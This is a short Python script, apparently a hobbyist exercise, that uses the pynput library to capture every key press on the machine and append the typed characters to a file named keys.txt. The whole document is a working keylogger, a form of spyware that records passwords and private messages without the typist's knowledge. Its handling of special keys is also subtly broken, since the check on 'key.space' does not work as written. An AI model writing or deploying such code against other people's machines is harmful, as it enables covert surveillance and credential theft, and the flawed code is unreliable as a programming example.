from pynput import keyboard
def keyPress(key): # the "on_press=" passes the key auto to the fn
    print(str(key))
    with open("keys.txt",'a') as logKey:
        try:
            ch=key.char
            logKey.write(ch)
        except:
            if(key.space):
                ch=" ";
                logKey.write(ch)
            else:               
                print("ERROR 404")
if __name__ == "__main__":
    l=keyboard.Listener(on_press=keyPress) #creating an obj of Listener
    l.start()
    input()
